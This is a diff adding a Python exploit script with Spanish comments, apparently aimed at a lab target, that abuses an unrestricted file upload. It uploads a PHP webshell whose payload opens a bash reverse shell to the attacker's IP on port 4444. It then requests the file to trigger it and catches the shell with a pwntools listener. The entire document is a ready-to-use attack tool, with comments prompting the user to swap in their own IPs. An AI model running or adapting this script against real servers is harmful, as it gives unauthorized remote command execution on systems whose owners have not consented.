@@ -1,0 +1,50 @@
+#!/usr/bin/python3
+
+import signal
+import sys
+import requests
+import threading
+from pwn import *
+
+#### Crtl
+def def_handler(sig, frame):
+    print("\n[+] Saliendo...")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+#### Var
+main_url = "http://192.168.1.27/" # <--- Cambiar IP
+upload = "upload.php"
+lport = 4444
+
+#### Subir webshell
+
+filename = "webshell.php"
+payload = """<?php system ("bash -c 'bash -i >& /dev/tcp/192.168.1.34/4444 0>&1'"); ?>"""  # <--- Cambiar IP
+
+file_to_upload = {
+        'fileToUpload': (filename, payload, 'application/x-php')
+    }
+
+def file_upload():
+    response = requests.post(main_url+upload, files=file_to_upload)
+#    if response.status_code == 200:
+#        print(response.text)
+#    else:
+#        print(response.status_code)
+
+    response = requests.get(main_url+filename)
+
+if __name__ == "__main__":
+    
+    file_upload()
+    
+    try:
+        threading.Thread(target=file_upload, args=()).start()
+    except Exception as e:
+        log.error(str(e))
+
+    shell = listen(lport, timeout=15).wait_for_connection()
+
+    shell.interactive()
